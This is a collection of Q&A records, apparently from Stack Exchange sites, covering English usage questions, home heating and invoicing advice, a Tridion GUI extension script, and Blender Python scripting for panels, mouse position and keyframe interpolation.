{"title": "Difference between \"why\" and \"what for\"?", "description": "What is the difference between \"why\" and \"what for\"? Can they be used interchangeably?\n", "answer": "Note that \"What for?\" is informal/conversational.  \n\"What Purposeful Reason?\"\n\"What for\" denotes a purposeful reason, while \"Why?\" can be used for causes, reasons, or explanations.\n\nStatement 1: \"I am going to work now.\"\nWhy? (Explanation):  \"Because it's time for me to leave.\"\nWhy? OR What for? (Purpose): \"To make money.\"\n\nStatement 2: \"Things fall.\"\nWhy (explanation):  \"Because of gravity...\"\nWhy (Purpose): \"Because of gravity.\" / \"No, I mean, why is it like that?  Why is there gravity?\" / \"Who knows? That's just the way it is. God? Quantum Multiverse? That may not be answerable.\"\nWhat for (purpose only!): \"Who knows? God? Quantum Multiverse? That may not be answerable.\"\n\nStatement 3: \"I exist.\"\nWhy (Explanation/Cause): \"Because your parents had sex, your mother got pregnant, and you were born.\"\nWhy OR What for? (Purpose): \"In order to propagate the species.\" OR \"For God's mysterious reason.\" OR \"Nobody knows.\" OR \"There is no purpose; it's a quantum multiverse.\"\n\nVariations can be created by sentences like \"What is $NounPhrase$ for?\" For example, if one is in a new car with a salesman, one can ask \"What is that button for?\" In this case, the question is asking for the functional purpose of the button.  Also, \"What is math good for?\" is asking for suitability for a purpose.\n\n\"What for!?\" -- Emphasis / Surprise / Suspicion\n\"What for\" can lend itself to more emotion than a simple \"Why\", adding surprise, suspicion, or just more emphasis. In this case, \"what for\" can be asking for an explanation just like \"why\":\n\nStatement 4: \"I am going to work now.\"\nWhat for!? You just got home! (Surprise/Explanation): / \"Because I left my wallet there.\"\n\nThe emotion behind \"What for?\" can also be suspicion or interrogation. There can be a bit of eye squinting or head tilting:\n\"Can I ask you your name?\"\n\"Ummm.  What for?\"  (Suspicion)\n \n\n\"For what?\" -- Identifying ambiguity.\n\"What for\" can also be used to mean \"For what?\" in order to identify an ambiguous reference. The emphasis is on replacing the \"what\" with the named item rather than replacing the \"for\" with the named reason:\n\n\"I'm looking for something.\" / \"For what?\" / \"For my glasses.\"\n\"I'm looking for something.\" / \"What for?\" / \"My glasses.\" (Same as \"For what\")\n\"What are you looking for?\" / \"My glasses.\" \n\nHere's another one:\n\n\"I need some help.\" / \"What for?\" / \"To reach that top shelf.\" / \"Ok, what for?\" / \"That coffee mug.\" \n\nBoth \"what for\" questions could be asking for purposeful reason. For example, in the 2nd case, the reason could have been to clean the shelf. But the answer given in the 2nd case was an identification of the object desired.\nAlso, \"What am I responsible for?\" is asking for identification of responsibilities. It is like \"For what am I responsible?\", but the fronted what sounds more natural.\n", "question_score": "9", "answer_score": 13}
{"title": "Difference between being at/of/in someone's service", "description": "What's the difference between being at someone's service, of someone's service, and in someone's service?\n", "answer": "This sentence should help clarify the differences between these:\n\nThe butler Mr. Dawkins, previously in the service of Lord Halsey as his valet, and having been of service to Lady Bucket by helping her find her lost Persian cat, said to Lord Bennett, \"I am at your service, sir.\"\n\nTo be in (someone's) service means that you are employed by that person in some kind of service role.  \nTo be of service (to someone) means that you have assisted or will assist them in some way.  It is not necessary for you to work in service to do this. Anyone can be of service to anyone else.\nTo be at (someone's) service means that you are offering (or someone else has offered) your (usually temporary) help to someone, in a formal and deferential manner.  Again, anyone can be at anyone else's service.\nThe use of the word \"service\" in all three relates to an older meaning of the noun, related to servant, a collective term for the various professions employed by a wealthy (or at least nominally upper middle class) family to do domestic tasks.  These included such jobs as butler, valet, housekeeper, maid, chauffeur, groundskeeper, footman, cook, etc.  \nThis was much more common a hundred years ago than it is today.  Still, there are still many people who work \"in service\" -- but who are not called \"servants\", which nowadays is considered demeaning.  Instead they may be collectively referred to as \"the help\".\nIf you are \"of service\" you have helped someone in the way a servant would have done.  To be \"at someone's service\" is to offer your help as if you were their servant.  Neither is particularly negative, however, since the acts are presumably voluntary.\nNote this does not include \"customer service\" or \"food service\" or any of the many jobs that interact with the public, nor does it (usually) include people who work in hotels, spas, cruise ships, and other temporary lodgings, which are considered part of the \"hospitality industry\".  While any of these may be \"of service\" or \"at someone's service\", I think they would not describe themselves as \"in service\".\nAt least not in the US.  It might be different in other countries.\n", "question_score": "9", "answer_score": 18}
{"title": "What is another word for “sh*t”?", "description": "As we know, people in current society are more in to the word shit when they get frustrated over something. The real meaning of this word is solid waste from a person's or animal's body according to a dictionary I referred. So I find this word bit awkward to use in daily routine.\nIs there any better (less offensive) word to use instead of this when we get frustrated?\n", "answer": "Many cuss words in English have less offensive counterparts, often with phonetic similarities.\nIf you want your speech to sound less vulgar and coarse, use the terms on the left instead of the terms in parentheses:\n\nshoot (instead of shit) : Aw, shoot! I left my keys at home!\ndarn (instead of damn) : Darn! My ball went in the creek again.\ngosh darn it (instead of God damn it) : Gosh darn it! How many times have I asked you not to do that?\njeepers creepers (instead of Jesus Christ) : Jeepers creepers! You scared the crap out of me!\nfrickin’ or freaking (instead of fucking) : There's no freaking way I'm paying that much for this car.\n\nI won't look these all up, but NOAD does say:\n\njeepers (also jeepers creepers)\n  exclamation informal\n  used to express surprise or alarm : Jeepers! Do you think she saw?\n  ORIGIN 1920s: alteration of Jesus\n\nand M-W reports:\n\nfricking often vulgar \n  :  damned —used as an intensive\n  Origin: alteration of frigging, present participle of frig\n  First Known Use: circa 1936\n\nAs for the s-word being used both as an expletive and as a reference to excrement, the word crap has the same dual meaning, and then some. (The word crap can also refer to junk, or even be used as a verb in the game of craps.) Context invariably eliminates any potential confusion about which meaning applies, even when they occur close together:\n\nAw, crap! I got crap on my shoe.\n\n", "question_score": "9", "answer_score": 11}
{"title": "\"It's difficult organising me\" or \"It's difficult organising myself\"", "description": "I have been studying the use of the pronouns me, myself and I. I am fairly confident in tests, but there are some sentences that does not feel \"right\" to me (being a a native speaker myself). Maybe someone could identify why my understanding of these grammar rules are incorrect. \nSo the issue is whether or not to use reflexive pronouns. According to the textbook definition, reflexive pronouns refer back to the subject of the sentence and they cannot be used as the actual subject of the sentence.\nMy instinct would be to choose the first choice, and we can ignore the second part of the sentence (unless it matters). Can someone please also identify the subject and verb in the first part of the sentence? (It gets confusing for me when there is an \"it\" and \"is\" in a sentence).\nSo according to the rule, a reflexive pronoun has to refer back to the subject of the sentence. However if the first one is true, I don't see how it refers back to \"I\". For the second one, it seems like the grammar rules fit, however it sounds really incorrect, and it implies that someone is organising me, instead of me organising myself, which I don't get.\n\nIt's difficult enough organising myself, let alone organising someone else as well.\n\nOr\n\nIt's difficult enough organising me, let alone organising someone else as well.\n\nHere is another example. For this one, the first option seems more \"correct\". \nAgain, can someone please identify the verb and the subject? (I get unsure when \"if\" and \"it\" and \"is\" are in play)\n\nIf it's just me at home, I leave the dishes until the next day.\n\nOr\n\nIf it's just myself at home, I leave the dishes until the next day.\n\nI would be very grateful if someone can clear my confusion up.\n", "answer": "First of all this is not a good rule. The rules for reflexive pronouns are very complex, which is probably the most important thing to know. Nonetheless, here are some generalisations we can make:\nWe require reflexive pronouns when they co-refer with a noun phrase earlier in the immediate clause, or within a larger noun phrase:\n\nJohn described himself. (coreferent within clause)\nJohn's letter to himself ... (coreferent within noun phrase)\n\nThere are some basic caveats to these two descriptions. One of these, for example, is that when the pronoun occurs within a locative phrase, we do not need to use a reflexive:\n\nHe placed the book beside him. \n\nNo reflexive is required in the example above because him is in the locative phrase beside him.\nNotice that the coreferent does not need to be the Subject of the clause:\n\nI gave Bernie a picture of herself.\n\nIn the example above, Bernie is not the Subject of the clause, but the Indirect Object.\nImportantly for the question here, even when the verb in question has no expressed Subject, the reflexive pronoun is used when it is understood to have the same identity as the notional or understood Subject:\n\nTake care of yourself.\n\nIn the imperative above, the understood Subject of the sentence is, or course, you. Because the word yourself corefers with this notional Subject, it must be reflexive.\nThis point explains the difference between the Original Poster's first two examples:\n\nIt's difficult enough organising myself, let alone organising someone else as well.\nIt's difficult enough organising me, let alone organising someone else as well.\n\nIn these sentences the pronouns occur within subordinate clauses headed by the verb organising. In the first sentence the notional Subject of this verb must be analysed as me. The reflexive pronoun myself is co-referring with this Subject. In the second sentence the Subject of the verb organising needs to be determined from the context. We could conjecture that perhaps the notional Subject is the speaker's carer. The two sentences would then mean:\n\nIt's difficult enough [me organising myself] yet alone me organising anyone else.\nIt's difficult enough [my carer organising me] yet alone her organising anyone else.\n\nIn the second sentence me does not co-refer with an overt or notional Subject and therefore me is not reflexive.\n\nWe now move on to the case of override reflexives. These occur in a very limited amount of situations when the pronoun is a Complement of the verb, but does not co-refer with another noun phrase in the clause. These have been being used for eons although prescriptivist hacks might lead you to believe otherwise. Here is the introduction to reflexive overrides in the Cambridge Grammar of the English Language, 2002:\n\nCaGEL then goes on to explain the very specific situations in which an override is possible. One of these is when the pronoun is the Complement of the verb BE when used in its specifying sense. Here is the description of overrides with regards to Predicative Complements and the verb BE:\n\nThis is the situation that we find in the Original Poster's fourth example:\n\nIf it's just myself at home, I leave the dishes until the next day.\n\nHere the pronoun myself is the Complement of the verb BE used in its specifying sense. Therefore a reflexive pronoun is admissible. Of course, this is an override, so the more frequent usage would be with a regular pronoun, as in the Original Poster's third example:\n\nIf it's just me at home, I leave the dishes until the next day.\n\nBoth of the above are completely grammatical.\n\nGrammar Note:\nThe CaGEL go into some depth about when overrides are and are not possible. It is not straightforwardly the case that we can override in every case of the pronoun being the Complement of specifying BE, for example. If you would like to read more about override reflexives, you can do so here: CaGEL 1494. If you would like to read more about reflexives in general you can do so here: CaGEL, p. 1483. If you would like to read about the emphatic use of reflexive pronouns, you can do so here: CaGEL, p. 1496.\n", "question_score": "9", "answer_score": 12}
{"title": "What is the joke in this context? (a \"spring\" in my step)", "description": "This conversation is from a tv series, Modern Family, and Manny(boy) comes into a room looking cheerful and talks to his step-father (Jay).\n\nManny: Hey Jay! Have you noticed a spring in my step?\nJay: Oh, kids say cruel things. That doesn't mean you'll turn out that way.\nManny: (frowning) No. We have something in common. I'm seeing a younger woman.\nJay: How much younger are we talking about?\nManny: 13 months. She makes me feel like a fifth grader again.\n\nI know what \"spring in one's step\" means - you're walking lightly and it shows your happiness etc. - but I don't understand Jay's remarks following Manny's line. Turn out what way? How has Jay understood Manny's words so that he answers like that?\nI mean, I can guess Jay presumed \"a spring in my step\" to be an insult from one of Manny's peers mocking the way he walks rather than understanding the idiomatic meaning, but I don't understand how Jay understood it. What does \"spring\" mean here, then? Is it \"flexibility\"?\nI also saw an article saying that the writer of this episode is a lesbian, so there were several gay jokes in it, including this one about the spring in his step, but this just confuses me more. How is it a gay joke? How should I understand this to make it qualify as a gay joke? (I'm not sure if it's relevant, but just so you know, neither Jay nor Manny is gay in this show.)\n", "answer": "The meaning of \"spring in one's step\", as Manny used it, is this:\nWiktionary\n\nspring in one's step (idiomatic)\nenthusiasm, energy or a positive outlook or cheerful attitude.\nAfter her promotion, she carried out her new position with a spring in her step and a contagious smile.\n\nThe meaning of \"spring\" is \"jump\" or \"leap\". Someone who has a spring in his step is the opposite of someone who is depressed.\nHowever, Jay has interpreted \"spring in my step\" to mean that Manny's peers have told him he has a spring in his step because they think he is effeminate, or even homosexual. Manny didn't mean it that way at all, and \"spring in my step\" is his own phrase, used to mean that he is light-hearted because of his infatuation with a girl. The joke is Jay's misinterpretation, contrasted with Manny's unconcern.\nCompare \"light in the loafers\":\nGrammarphobia\n\nCassell’s Dictionary of Slang (2d ed.) has only a brief entry, describing the expression as ‘50s American slang and adding that “the image is the stereotyped effeminate male, tripping along.”\n\nThe Random House Historical Dictionary of American Slang, which defines it as effeminate or homosexual, lists a series of references for the expression dating from 1967 to 1996.\n\n", "question_score": "9", "answer_score": 15}
{"title": "Is \"Selfsame\" dated?", "description": "Selfsame word I know only from the X-Men comics, where it makes the sentences sound very stilted, which is perfect, since the user is the wacky alien Warlock.\nUnfortunately self has no actual example of that (I know only that Warlock constantly is a 3rd person person), and this sentence is definitely ungrammatically.\nTwo questions: a) Is \"selfsame\" in wide colloquial use or does it sound stilted even if you are no wacky alien, b) if you have the comics, is it used with correct grammar there?\n", "answer": "Selfsame as in \"the very same\":\nHere is the Wall Street Journal:\n\nAnd that frustration must surely give way to hair-pulling apoplexy when those selfsame politicians helpfully suggest that central banks stop sitting on their printing presses and embark on the latest cruise ship-designated round of stimulus to help them out.\nFrom an article published in The Wall Street Journal on August 16, 2011\n\nIt is still used in formal or journalistic or even literary writing.\n\nThose selfsame politicians have been laboring long and hard in the basement of the capital building to come up with a plan to replace Obamacare.\nin a blog published on March 8, 2017\n\nI chose the word politicians as the term is easy to find associated with them.\nAnd you can go to ludwig.guru and search for \"those selfsame\" and you will find many others in newspapers such as the New York Times and The Guardian:\n\nOne of the more baffling parts of the recent Viacom versus YouTube court revelations was the astonishing finding that executives from MTV and pals were ordering YouTube to take down videos that infringed its copyright - while their minions were simultaneously uploading those selfsame copies.\nFrom an article published in The Guardian on March 30, 2010\n\n", "question_score": "9", "answer_score": 17}
{"title": "Practical and cheap ways to get warm at home this winter?", "description": "Since winter is near, can someone suggest some practical ways to get warm at home without spending too much in gas or electricity?\nAlso for every solution, please add if it can be done homemade and what the approximate costs are?\nMore information:\nthe problem of my home now is that it is using gas-water heating system, but this consumes a lot of gas and the actual walls are not very isolated against external.\nI wanted to avoid the use of gas or find any better solution.\n", "answer": "There are two main categories to consider here.\nThe first is to improve the efficiency of how your home is kept warm - either by increasing the efficiency of the heating system, or by reducing the rate at which warmth is lost to the outside. If your home is quite \"leaky\" then major gains can be made this way quite cheaply. Other answers to this and other questions have given some guidance on this.\nThe second is to think about ways to reduce the need for heating your home. Things that you could consider (some of which are probably obvious):\n\nWear warmer clothing at home.\nIf you use heating in your bedroom during the night, turn it off. If you find yourself waking up due to the cold, invest in warmer blankets or duvet, or warm pyjamas. Except in the coldest and leakiest houses, in harsh climates, bedroom heating is often not strictly necessary - although using some \"comfort\" heating in the mornings certainly makes it easier to get out of bed! A hot water bottle can help to alleviate the discomfort of a cold bed until your body heat warms it up.\nIf you do want to heat your bedroom, then use an electric blanket to heat the bed, and your body, rather than warming the whole room. NB ensure that this is in good condition and observe safety instructions. Note, however, that some sources do not recommend living at below 16C - although it is not clear whether this applies to sleeping as well as waking conditions.\nDon't heat rooms that you don't use (depending on climate, you may want to keep a background level of heating to prevent mould or freezing). If you live in many rooms, consider whether you can live in fewer.\nDon't heat corridors or hallways - instead, close the door of the room that you're in.\n\nBear in mind that being cold at home can be detrimental to your physical and mental health. None of the above should be construed as \"live with being uncomfortably cold\" - instead, think of it as suggestions on how to remain comfortable while using less energy.\n", "question_score": "8", "answer_score": 15}
{"title": "Component Fields available in GUI Extension with fieldBuilder", "description": "I would like to get all the Component fields in the Component View from a GUI Extension.  I am following the excellent code sampels provided here:  GUI extension to hide field in 2011 SP1\nMy problem is that the fieldBuilder.properties collection does not contain an input property, and only contains 11 total properties at my breakpoint in the GUI Extension.  However, when I use the same javascript code in the Chrome console I do get input and also I have a total of 24 properties.\nHow can I change the EventHandler or my config to get it at a later moment in the window loading?  Config and Javascript posted below:\nReadonly.js\n//If you only want your code to affect certain screens/views, you should listen to Anguilla events like this:\n$evt.addEventHandler($display, \"start\", onDisplayStartedReadonly);\n\n// This callback is called when any view has finished loading\nfunction onDisplayStartedReadonly() {\n    console.log('View=' + $display.getView().getId());\n\n    $evt.removeEventHandler($display, \"start\", onDisplayStartedReadonly);\n\n    if ($display.getView().getId() == \"ComponentView\") {\n        debugger;\n        var fieldBuilder = $display.getView().properties.controls.fieldBuilder;\n\n        fieldsContainer = fieldBuilder.properties.input;\n        fieldsNode = fieldsContainer.getElement();\n        control = null;\n\n        $j(fieldsNode).children().each(function (index, elm) {\n            var cntrl = $j('div.input', elm)[0].control;\n            console.log('fieldname=' + cntrl.getFieldName());\n        });\n    }\n}\n\nConfig:\n<?xml version=\"1.0\"?>\n<Configuration xmlns=\"http://www.sdltridion.com/2009/GUI/Configuration/Merge\"\n               xmlns:cfg=\"http://www.sdltridion.com/2009/GUI/Configuration\"\n               xmlns:ext=\"http://www.sdltridion.com/2009/GUI/extensions\"\n               xmlns:cmenu=\"http://www.sdltridion.com/2009/GUI/extensions/ContextMenu\">\n  <resources cache=\"true\">\n    <cfg:filters />\n    <cfg:groups>\n      <cfg:group name=\"Readonly.CommandSet\" merge=\"always\">\n        <cfg:fileset>\n            <cfg:file type=\"script\" id=\"jQuery16Readonly\">/Readonly/jquery-1.6.4.js</cfg:file>\n            <cfg:file type=\"script\" id=\"readonlyJs\">/Readonly/Readonly.js</cfg:file>\n        </cfg:fileset>\n        <cfg:dependencies>\n          <cfg:dependency>Tridion.Web.UI.Editors.CME</cfg:dependency>\n          <cfg:dependency>Tridion.Web.UI.Editors.CME.commands</cfg:dependency>\n        </cfg:dependencies>\n\n      </cfg:group>\n    </cfg:groups>\n  </resources>\n  <definitionfiles />\n  <extensions>\n    <ext:dataextenders />\n    <ext:editorextensions>\n      <ext:editorextension target=\"CME\">\n        <ext:editurls />\n        <ext:listdefinitions />\n        <ext:taskbars />\n        <ext:commands />\n        <ext:commandextensions>\n          <ext:commands>\n          </ext:commands>\n          <ext:dependencies>\n            <cfg:dependency>Readonly.CommandSet</cfg:dependency>\n          </ext:dependencies>\n        </ext:commandextensions>\n        <ext:contextmenus />\n        <ext:lists />\n        <ext:tabpages />\n        <ext:toolbars />\n        <ext:ribbontoolbars />\n      </ext:editorextension>\n    </ext:editorextensions>\n  </extensions>\n  <commands>\n    <cfg:commandset/>\n  </commands>\n  <contextmenus />\n  <localization />\n  <settings>\n    <defaultpage />\n    <editurls />\n    <listdefinitions />\n    <itemicons />\n    <theme>\n      <path />\n    </theme>\n    <customconfiguration>\n    </customconfiguration>\n  </settings>\n</Configuration>\n\n", "answer": "You can run your extension code when the thread gets executed. To do so, try following\nfunction onDisplayStartedReadonly() \n{\n    $evt.removeEventHandler($display, \"start\", onDisplayStartedReadonly);\n\n    function onDisplayStartedReadonly$_collectProperties()\n    {\n        if ($display.getView().getId() == \"ComponentView\") \n        {\n            debugger;\n            var fieldBuilder = $display.getView().properties.controls.fieldBuilder;\n\n            fieldsContainer = fieldBuilder.properties.input;\n            fieldsNode = fieldsContainer.getElement();\n            control = null;\n\n            $j(fieldsNode).children().each(function (index, elm) {\n                var cntrl = $j('div.input', elm)[0].control;\n                console.log('fieldname=' + cntrl.getFieldName());\n            });\n        }\n    }\n\n    setTimeout(onDisplayStartedReadonly$_collectProperties, 0);\n}\n\nand plan \"B\", is to listen on on fieldbuilder \"load\" event\nif ($display)\n{\n    (function()\n    {\n        $evt.addEventHandler($display, \"start\", Extension$onDisplayStartedReadonly);\n\n        function Extension$onDisplayStartedReadonly()\n        {\n            $evt.removeEventHandler($display, \"start\", Extension$onDisplayStartedReadonly);\n\n            var view = $display.getView();\n            if (view && Tridion.OO.implementsInterface(view, \"Tridion.Cme.Views.Component\"))\n            {\n                var fieldBuilder = view.properties.controls.fieldBuilder;\n                $evt.addEventHandler(fieldBuilder, \"load\", Extension$onDisplayStartedReadonly$_collectProperties);\n            }\n        };\n\n        function Extension$onDisplayStartedReadonly$_collectProperties(event)\n        {\n            var fieldBuilder = event && event.source;\n            if (fieldBuilder)\n            {\n                var fieldsContainer = fieldBuilder.properties.input;\n                var fieldsNode = fieldsContainer.getElement();\n                var control = null;\n\n                $j(fieldsNode).children().each(function (index, elm)\n                {\n                    var cntrl = $j('div.input', elm)[0].control;\n                    console.log('fieldname=' + cntrl.getFieldName());\n                });\n            }\n        };\n    })();\n}\n", "question_score": "9", "answer_score": 11}
{"title": "What should be on an invoice?", "description": "When I send an invoice to a client, what should I put on it, apart from the obvious amount? If, for example, I do not have a registered company, should I just put my name on it?\nAre there any templates available for invoices?\n", "answer": "Since the requirements for an invoice are very country-specific, I'll give a general answer on how to get these data.\nYou need to get to the site of your government. If your country has an organization for business & self employed with a separate website, go there. For example, for UK residents, there would be gov.uk, clicking further gives gov.uk/browse/business. Search for 'invoice'. On the UK website, this leads to this page, which gives a clear overview of the requirements of an invoice.\n\nYou must clearly display the word ‘invoice’ on the document. You must also include:\n\na unique identification number\nyour company name, address and contact information\nthe company name and address of the customer you are invoicing\na clear description of what you are charging for\nthe date the goods or service were provided (supply date)\nthe date of the invoice\nthe amount(s) being charged\nVAT amount if applicable\nthe total amount owed\n\nIf your company is a registered limited company, you must also include:\n\nyour company registration number\nthe address of your company’s registered office\n\nThis list is very basic. It will be the same for most countries, with just a few minor changes. However, to be sure, find the website of your government and look it up. There might or might not be different rules when trading with companies abroad, and whether or not different rules apply depends on the other country in most cases. Try to find the information on the website of your government. If you cannot find it, contact them. It's important that you are sure about it.\nIt is not a good idea to keep this information on this website, because it might change and can have considerable impacts.\n", "question_score": "6", "answer_score": 10}
{"title": "Creating a custom permanent property in Blender 2.70 python script to access in GUI Panel", "description": "I was going through the \"Getting started\" API documentation for 2.68 since I'm guessing 2.70 is similar. I was testing out how to create my first script in 2.70 which I would like to save values which I will need later for future computations. I am using the Blender Panel UI for the user to modify the properties. Here is the basic code I'm stuck at from the HellowWorldPanel class. I was wondering why my property field isn't showing up in the Panel.\n(Edit: I'm sorry just to clarify this, the panel is showing up with my \"Hello world!\" label but my property called \"bl_mine1\" isn't showing up in the newly created panel)\nHere is the code I am testing it with:\nimport bpy\n\nclass HelloWorldPanel(bpy.types.Panel):\n    \"\"\"Creates a Panel in the Object properties window\"\"\"\n    bl_label = \"Hello World Panel\"\n    bl_idname = \"OBJECT_PT_hello\"\n    bl_space_type = 'PROPERTIES'\n    bl_region_type = 'WINDOW'\n    bl_context = \"object\"\n    bl_mine1 = bpy.props.FloatProperty(name = \"MyProperty\")\n\n    def draw(self, context):\n        layout = self.layout\n\n        obj = context.object\n        #Create New Row with text Hello World\n        row = layout.row()\n        row.label(text=\"Hello world!\", icon='WORLD_DATA')\n        #Try showing a field box with MYProperty in it\n        row = layout.row()\n        row.prop(obj, \"bl_mine1\")\n\ndef register():\n    bpy.utils.register_class(HelloWorldPanel)\n\ndef unregister():\n    bpy.utils.unregister_class(HelloWorldPanel)\n\nif __name__ == \"__main__\":\n    register()\n\nThanks for any input.\n", "answer": "Since your example panel is in the object context I assume you want to use the data on objects.\nIf you want to store and retrieve properties on a per object basis you can append a property to objects like this:\nbpy.types.Object.obj_property = bpy.props.FloatProperty(name = \"ObjectProperty\")\n\nand access the value in the UI like this:\nrow.prop(context.object, \"obj_property\")\n\nOr if you need your property for all objects in a scene you could store it inside the scene like this:\nbpy.types.Scene.scn_property = bpy.props.FloatProperty(name = \"SceneProperty\")\n\nand access the value in the UI like this:\nrow.prop(context.scene, \"scn_property\")\n\nTo access the property values in your script you can also use the bpy.data module.\nNote that operators and panels are conceptually different. Panels are not supposed to store properties or change them on their own. They are just for user access to internal data and properties. Operators on the other hand have builtin access to properties and are better suited to manipulate data. Note also that properties are automatically stored in the .blend file while saving. If you want to share data between scenes you could use other ID blocks like Text or use a simple operator to copy data between scenes e.g. like this:\nimport bpy\n\nclass UIPanel(bpy.types.Panel):\n  bl_label = \"My Panel\"\n  bl_space_type = \"PROPERTIES\"\n  bl_region_type = \"WINDOW\"\n  bl_context = \"object\"\n  bpy.types.Scene.scn_property = bpy.props.FloatProperty(name = \"SceneProperty\")\n\n  def draw(self, context):\n    self.layout.operator(\"prop.propcopy\", text='Update Scenes')\n    self.layout.prop(context.scene,\"scn_property\")\n\nclass OBJECT_OT_PropCopyButton(bpy.types.Operator):\n  bl_idname = \"prop.propcopy\"\n  bl_label = \"Propcopy\"\n\n  def execute(self, context):\n    sc0 = context.scene\n    for sc in bpy.data.scenes:\n        sc.scn_property = sc0.scn_property\n    return{'FINISHED'}\n\nbpy.utils.register_module(__name__)\n\n", "question_score": "9", "answer_score": 11}
{"title": "How to get mouse position in a window with Python?", "description": "I want to detect if the mouse is in certain area of the 3d View, so I can display a custom menu when it will be in the left top corner, over the view name (\"User Persp\" etc).\n", "answer": "Here is a script from the blender wiki.\nGo to the Invoke versus execute section for finding this code:\n#----------------------------------------------------------\n# File invoke.py\n# from API documentation\n#----------------------------------------------------------\n \nimport bpy\n \nclass SimpleMouseOperator(bpy.types.Operator):\n    \"\"\" This operator shows the mouse location,\n        this string is used for the tooltip and API docs\n    \"\"\"\n    bl_idname = \"wm.mouse_position\"\n    bl_label = \"Mouse location\"\n \n    x: bpy.props.IntProperty()\n    y: bpy.props.IntProperty()\n \n    def execute(self, context):\n        # rather then printing, use the report function,\n        # this way the message appears in the header,\n        self.report({'INFO'}, \"Mouse coords are %d %d\" % (self.x, self.y))\n        return {'FINISHED'}\n \n    def invoke(self, context, event):\n        self.x = event.mouse_x\n        self.y = event.mouse_y\n        return self.execute(context)\n \n#\n#    Panel in tools region\n#\nclass MousePanel(bpy.types.Panel):\n    bl_label = \"Mouse\"\n    bl_space_type = \"VIEW_3D\"\n    bl_region_type = \"TOOL_PROPS\"\n \n    def draw(self, context):\n        self.layout.operator(\"wm.mouse_position\")\n \n#\n#   Registration\n#   Not really necessary to register the class, because this happens\n#   automatically when the module is registered. OTOH, it does not hurt either.\nbpy.utils.register_class(SimpleMouseOperator)\nbpy.utils.register_module(__name__)\n \n# Automatically display mouse position on startup\nbpy.ops.wm.mouse_position('INVOKE_DEFAULT')\n \n# Another test call, this time call execute() directly with pre-defined settings.\n#bpy.ops.wm.mouse_position('EXEC_DEFAULT', x=20, y=66)\n\nNow if you want to know the position of your 3D view, I made a quick research. With this you can find the area of your 3D View:\nimport bpy\n\nfor area in bpy.context.screen.areas:\n    if area.type=='VIEW_3D':\n        X= area.x\n        Y= area.y\n        WIDTH=area.width\n        HEIGHT=area.height\n        \n        print(X,Y,WIDTH,HEIGHT)\n\n", "question_score": "9", "answer_score": 12}
{"title": "How to make a circular swipe?", "description": "I'm trying to make a video similar to this one (Made in Adobe After Effects)\nhttps://www.youtube.com/watch?v=YAV5DwR1pU8\nBut I don't know how to make the circle disappear than reappear with a circular swipe. Any help is GREATLY appreciated.\n", "answer": "Here is another way using beveled curves:\n\nAdd a Bezier Circle in Object Mode and press Tab to enter Edit Mode.\nWith all handles selected press V and select Free.\nSelect only one handle and press AltC to open the circle.\nPress ShiftS and choose Cursor to Selected.\nSelect the handle on the other side of the opening and press E to extrude and Enter to confirm.\nPress ShiftS, and choose Selection to Cursor (Offset) to move the handle to the other side.\nRotate the handle by 90 or 270 degress to get a circular shape (R $Axis $Degress), then leave Edit Mode.\nAdd a Path in Object Mode. To get a closed slice, scale the Path by .5. Otherwise, < .5.\nSelect the Bezier Circle again. Under Curve Properties - Geometry - Bevel Object select the name of the newly added Path (e.g. NurbsPath). \nTo animate the slice use the Start and End values (Geometry - Bevel Factor).\n\nThis should be the result (animated scale of the Path, Start and End values of the Bevel Factor):\n\nAnother way could be using the Array Modifier together with the Curve Modifier to get some line effects (similar to the reference you provided).\nStarting from a Bezier Circle and a Plane in the same spot, add both modifiers to the Plane. You can play with the scale of the Plane, count and offset of the Array Modifier to get different effects. \n\nHere some examples:\n\n", "question_score": "9", "answer_score": 15}
{"title": "How to change to constant interpolation mode from a python script?", "description": "I have written a python script to create an animation out of a file containing the trajectory of some objects and I would like to switch to a constant mode of interpolation (I have one position per time step and other interpolation modes are really slow and not necessary in this case). The code is launched in the 3D view context.\nI have put the following code: \narea = bpy.context.area\nold_type = area.type\narea.type = 'GRAPH_EDITOR'\nbpy.ops.graph.select_all_toggle()\nbpy.ops.graph.interpolation_type(type='CONSTANT')\narea.type = old_type\n\nbut it does nothing... \nThanks for your help.\n", "answer": "slightly simple option (probably not the best in the long run)\nA toggle inverts, if all curves are selected it will select the curves that are not selected. The solution might be as simple as this.\nbpy.ops.graph.select_all_toggle(invert=False)\n\nbroader answer (which is hopefully more useful)\nEasy enough, but perhaps not very obvious.\nkf = bpy.data.objects['Cube'].animation_data.action.fcurves[0].keyframe_points[0]\nkf.interpolation = 'CONSTANT'\n\nor for Keyframes on all F-Curves of that object\nimport bpy\n\nobj = bpy.data.objects['Cube']\nfcurves = obj.animation_data.action.fcurves\nfor fcurve in fcurves:\n    for kf in fcurve.keyframe_points:\n        kf.interpolation = 'CONSTANT'\n\nWithout seeing your code I can only assume things about it. You can use the Outliner (DataBlocks view) to get a reasonable idea of where to look in the API for these things.\n\nAddendum\nIf the script seems to behave slowly, it might not be the interpolation but the way the script adds keyframes. I Might be wrong but I assume you are using something like this to add keyframes:\nbpy.ops.anim.keyframe_insert(type='Location', confirm_success=True)\n# this does more than just add keyframes\n\nThis would be faster: \nimport bpy\n\npositions = (0,0,2),(0,1,2),(3,2,1),(3,4,1),(1,2,1)\nstart_pos = (0,0,0)\n\nbpy.ops.mesh.primitive_uv_sphere_add(segments=32, size=0.3, location=start_pos)\nbpy.ops.object.shade_smooth()\nob = bpy.context.active_object\n\nframe_num = 0\n\nfor position in positions:\n    bpy.context.scene.frame_set(frame_num)\n    ob.location = position\n    ob.keyframe_insert(data_path=\"location\", index=-1)  # <-- this\n    frame_num += 10\n\nSetting the interpolation type at creation time:\nfor position in positions:\n    bpy.context.scene.frame_set(frame_num)\n    ob.location = position\n    ob.keyframe_insert(data_path=\"location\", index=-1)\n\n    for fcurve in ob.animation_data.action.fcurves:\n        kf = fcurve.keyframe_points[-1]\n        kf.interpolation = 'CONSTANT'\n    frame_num += 10\n\n", "question_score": "9", "answer_score": 13}
